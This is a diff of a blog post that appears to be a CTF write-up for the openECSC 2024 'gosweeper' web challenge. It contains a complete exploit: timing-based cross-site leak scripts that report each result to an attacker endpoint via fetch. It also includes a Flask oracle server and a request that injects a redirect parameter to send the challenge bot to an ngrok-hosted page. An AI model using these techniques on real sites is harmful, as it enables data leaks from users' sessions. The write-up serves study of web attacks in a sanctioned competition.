@@ -357,85 +357,91 @@ Here is the exploit:
 
 {{< code language="html" title="pwn.html" id="10" expand="Show" collapse="Hide" isCollapsed="false" >}}
 <html>
-<script>
-    const URL = "https://gosweeper.challs.open.ecsc2024.it"
-    const id = "c444ba1b1bdaaf883151c13afca7bf1a"
-    const to_guess = 3
-    
-    window.open(URL + "/clone?cloneid=" + id);
-    window.open("/?guess=" + to_guess);
-	
-	</script>	
+   <head>
+      <title>NASLAB</title>
+   </head>
+   <body>
+      <script>
+         const URL = "https://gosweeper.challs.open.ecsc2024.it"
+         const id = "c444[...]"
+         const to_guess = 9
+         
+         window.open(URL + "/clone?cloneid=" + id);
+         window.open("/?guess=" + to_guess);
+         
+      </script>	
+   </body>
 </html>
 {{< /code >}}
 
 
 {{< code language="html" title="index.html" id="11" expand="Show" collapse="Hide" isCollapsed="false" >}}
 <html>
-		<body>
-			<form
-			method="POST"
-			action="https://gosweeper.challs.open.ecsc2024.it/guess"
-			id="form"
-			target="popup">
-
-			<input type="hidden" name="guess" id="to_guess" value="7" />
-			<input type="submit" value="submit" />
-		  </form>
-
-</body>
-
-<script>
-	
-	const urlParams = new URLSearchParams(window.location.search);
-	let guess = urlParams.get('guess');
-	
-	if (guess == undefined) {
-		guess = 0
-	}
-
-	document.getElementById("to_guess").value = guess;
-
-		var limit = 600;
-
-		var b = window.open("about:blank", "popup", "width=300, height=300");
-		document.forms["form"].submit();
-		
-		setTimeout(() => {
-			var t = performance.now();
-		var a = window.open("https://gosweeper.challs.open.ecsc2024.it/board?xray=1", "", "width=300, height=300");
-	
-	
-		function measure(){			
-				try{
-					a.origin;
-					
-					setTimeout(() => {
-						measure();
-					}, 0);
-					
-				}catch(e){
-	
-					var time = performance.now() - t;
-					let is_bomb = false;
-					
-					if (time > limit) {
-						is_bomb = true;
-					}
-					
-					console.log("is_bomb", is_bomb)
-					fetch("/naslab?is_bomb="+is_bomb + "&guess=" + guess)
-
-					if (is_bomb == false && guess < 48) {
-						document.location.href = "/?guess=" + (parseInt(guess) + 1) + "&time=" + time
-					}
-				}
-			}
-	
-		measure()
-		}, 100)
-		
-	</script>
+   <head>
+      <title>NASLAB</title>
+   </head>
+   <body>
+      <form
+         method="POST"
+         action="https://gosweeper.challs.open.ecsc2024.it/guess"
+         id="form"
+         target="popup">
+         <input type="hidden" name="guess" id="to_guess" value="7" />
+         <input type="submit" value="submit" />
+      </form>
+	  
+      <script>
+         const urlParams = new URLSearchParams(window.location.search);
+         const guess = urlParams.get('guess');
+         
+         if (guess == undefined) {
+         	guess = 0;
+         }
+         
+         document.getElementById("to_guess").value = guess;
+         
+         var limit = 600;
+         
+         window.open("about:blank", "popup", "width=300, height=300");
+         document.forms["form"].submit();
+         
+         setTimeout(() => {
+         	var t = performance.now();
+         	var a = window.open("https://gosweeper.challs.open.ecsc2024.it/board?xray=1", "", "width=300, height=300");
+         
+         
+         	function measure() {
+         		try {
+         			a.origin;
+         
+         			setTimeout(() => {
+         				measure();
+         			}, 0);
+         
+         		} catch (e) {
+         
+         			let loading_time = performance.now() - t;
+         
+         			let is_bomb = false;
+         
+         			if (loading_time > limit) {
+         				is_bomb = true;
+         			}
+         
+         			console.log("is_bomb", is_bomb);
+         
+         			fetch("/naslab?is_bomb=" + is_bomb + "&guess=" + guess);
+         
+         			if (is_bomb == false && guess < 48) {
+         				document.location.href = "/?guess=" + (parseInt(guess) + 1) + "&time=" + loading_time;
+         			}
+         		}
+         	}
+         
+         	measure();
+         }, 100)
+      </script>
+   </body>
 </html>
 {{< /code >}}
 
@@ -449,70 +455,76 @@ The strategy is:
 Note that if you have a bad board, you can visit the `/newboard` route in the service to get a new board without losing the streak. A board can be cloned up to 5 times, so we can reveal the position of only 5 bombs per game.
 
 {{< code language="python" title="Flask server for serve the exploit and get the leak from the bot" id="12" expand="Show" collapse="Hide" isCollapsed="false" >}}
+from flask import Flask, request, render_template
 import requests
-import logging
-
-from flask import Flask, request, render_template, render_template_string
 
 app = Flask(__name__)
 
-log = logging.getLogger('werkzeug')
+import logging
+
+log = logging.getLogger("werkzeug")
 log.setLevel(logging.ERROR)
 
-GREEN = "\x1b[32m"
-RED = "\x1b[31m"
 
-@app.route('/pwn', methods=['GET'])
+@app.route("/pwn", methods=["GET"])
 def pwn():
-    # need to reload every time pwn.html
-    with open("templates/pwn.html", "r") as t:
-        template = t.read()
+    # need to reload every time pwn.html
+    with open("templates/pwn.html", "r") as t:
+        template = t.read()
 
-    return render_template_string(template)
+    return template
 
-@app.route('/', methods=['GET'])
+
+@app.route("/", methods=["GET"])
 def index():
-    return render_template("index.html")
+    return render_template("index.html")
 
-@app.route('/naslab', methods=['GET'])
+
+@app.route("/naslab", methods=["GET"])
 def home():
-    arguments = request.args
-    is_bomb = arguments.get("is_bomb", "")
+    arguments = request.args
 
-    if is_bomb == "false":
-        color = GREEN
-    else:
-        color = RED
+    is_bomb = arguments.get("is_bomb", "")
 
-    guess = arguments.get("guess", "")
+    if is_bomb == "false":
+        color = "\x1b[32m"
+    else:
+        color = "\x1b[31m"
 
-    print(color, f"CASELLA {guess}", "\x1b[0m")
-    
-    return "ok"
+    guess = arguments.get("guess", "")
 
-if __name__ == '__main__':
-    userid = "c444[...]"
-    cookie = "MTcxN[...]"
+    print(color, f"CASELLA {guess}", "\x1b[0m")
+
+    return "ok"
 
 
-    while True:
-        to_guess = input("Value to guess: ")
-        with open('pwn.html.template', "r") as t:
+if __name__ == "__main__":
+    userid = "c444[...]" # your userid here
+    cookie = "MTcx[...]" # your session cookie here
 
-            template = t.read().replace("{guess}", to_guess).replace("{userid}", userid)
+    while True:
+        to_guess = input("Value to guess: ")
 
-        with open("templates/pwn.html", "w") as t:
-            t.write(template)
+        with open("pwn.html.template", "r") as t:
+            template = t.read().replace("{guess}", to_guess).replace("{userid}", userid)
 
-        headers = {"Cookie": f"session={cookie}"}
+        with open("templates/pwn.html", "w") as t:
+            t.write(template)
 
-        requests.post("https://gosweeper.challs.open.ecsc2024.it/checkboard", data={"cloneid":"&redirect=//3013-87-21-109-73.ngrok-free.app/pwn"}, headers=headers)
+        headers = {"Cookie": f"session={cookie}"}
+        requests.post(
+            "https://gosweeper.challs.open.ecsc2024.it/checkboard",
+            data={"cloneid": "&redirect=//3013-87-21-109-73.ngrok-free.app/pwn"},
+            headers=headers,
+        )
 
-        try:
-            print("[*] Starting Oracle")
-            app.run(port=5000)
-        except KeyboardInterrupt:
-            print("[*] Closing oracle")
+        try:
+            print("[*] Started Oracle")
+
+            app.run(port=5000)
+
+        except KeyboardInterrupt:
+            print("[*] Closing oracle")
 {{< /code >}}
 
 ## Side notes
@@ -523,9 +535,9 @@ To master this challenge, he used this script:
 
 {{< code language="javascript" title="Script for the /board page" id="13" expand="Show" collapse="Hide" isCollapsed="false" >}}
 document.addEventListener('keydown', function(event) {
-  if (event.key === 'r') {
-    document.location = "/newboard"
-  }
+    if (event.key === 'r') {
+        document.location = "/newboard"
+    }
 });
 
 var i = 0
@@ -545,11 +557,12 @@ Essentially, it's a method to quickly identify the number on the card at a glanc
 
 {{< figure src="/img/openECSC/go_sweeper/no_mod.png" position="left" caption="Board page before injecting the script" captionPosition="left">}}
 
-
 {{< figure src="/img/openECSC/go_sweeper/mod.png" position="left" caption="Board page after injecting the script" captionPosition="left">}}
 
 Plus, if you hit the 'r' key, you can generate a new board. By overriding the page in the web browser, you can ensure these scripts remain active even after reloading.
 
 {{< figure src="/img/openECSC/go_sweeper/win.png" position="left" caption="Home after winning 20 consecutive boards" captionPosition="left">}}
+
+You can download the full exploit [here](/img/openECSC/go_sweeper/gosweeper_exploit.zip)
 
 > openECSC{st0p_l3ak1ng_pl34se_1c9832ea}
